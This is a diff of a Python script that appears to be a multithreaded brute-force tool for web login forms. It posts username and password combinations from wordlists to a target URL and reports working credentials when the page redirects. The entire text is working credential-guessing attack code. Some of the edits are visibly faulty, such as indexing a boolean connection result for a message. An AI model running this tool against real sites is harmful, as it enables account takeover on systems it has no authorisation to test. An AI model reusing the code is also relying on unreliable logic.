@@ -7,7 +7,7 @@ from time import sleep
 import utils
 
 verbosity = True
-args = parser.parse_args() # argument parser set up in ./args_parser.py
+args = parser.parse_args()  # argument parser set up in ./args_parser.py
 
 # setting verbbosity and checking if the user wants to use a wordlist or not
 if (args.login is None and args.login_file is None):
@@ -36,17 +36,15 @@ if (args.password_file is not None):
 # and checks if the website redirects to a page (i.e dashbord.php, home...)) in other words if the request url changed
 # if so, it means that the login was successful
 def brute_force(username, password):
-    global verbosity
-    global args
-
     session = requests.Session()
     payload = {args.login_param_name: username,
                args.password_param_name: password}
     post_req = session.post(args.url, data=payload)
-    if (args.url != post_req.url): # i will add more conditions to check wether the login was successful or not 
-                                   # as i come accross them and that are not explicit countrary to the usual "incorrect password" etc...
-                                   # if you have any other conditions to check that would indicate if the login was successful or not you can add them
-        
+    # i will add more conditions to check wether the login was successful or not
+    if (args.url != post_req.url):
+        # as i come accross them and that are not explicit countrary to the usual "incorrect password" etc...
+        # if you have any other conditions to check that would indicate if the login was successful or not you can add them
+
         log.info(
             f"found a valid username and password {username}:{password}", bold=True, underline=True)
         # killing all threads before exiting
@@ -63,27 +61,27 @@ def brute_force(username, password):
 
 
 def main():
-    global verbosity
-    global args
-    global brute_force
     if (verbosity):
 
         log.header(f"starting brute force with {args.threads} threads")
     connection_success = False
     times = 0
     while not connection_success:
-        connection_success = utils.try_connection(args.url, timeout=args.wait, follow_redirects=args.follow_redirects)
+        connection_success = utils.try_connection(
+            args.url, follow_redirects=args.follow_redirects)["success"]
         if not connection_success and times < 5:
-            log.error("connection failed, retrying...")
+            log.error(connection_success["message"])
             times += 1
             sleep(args.wait)
 
         if times == 5:
-            log.error("connection failed, exiting...")
+            log.error(
+                "could not establish a connection to the target, exiting...")
             exit(1)
 
     if connection_success:
-        log.okblue("connection successful")
+        if verbosity:
+            log.okblue("connection successful")
     for username in username_list:
         for password in password_list:
             t = threading.Thread(target=brute_force, args=(username, password))
@@ -93,7 +91,15 @@ def main():
             while threading.active_count() > args.threads:
                 pass
 
+    while all([th.is_alive() for th in threading.enumerate()]):
+        pass  # waiting for all the threads to finish to log that no valid credentials were found
+
+                          
+    log.error("no valid credentials were found") # if the program arrives here it means that no valid credentials were found
+                                                 # because if found, the program would have exited
+
 
 if __name__ == "__main__":
-    utils.print_banner()
+    if (verbosity):
+        utils.print_banner()
     main()
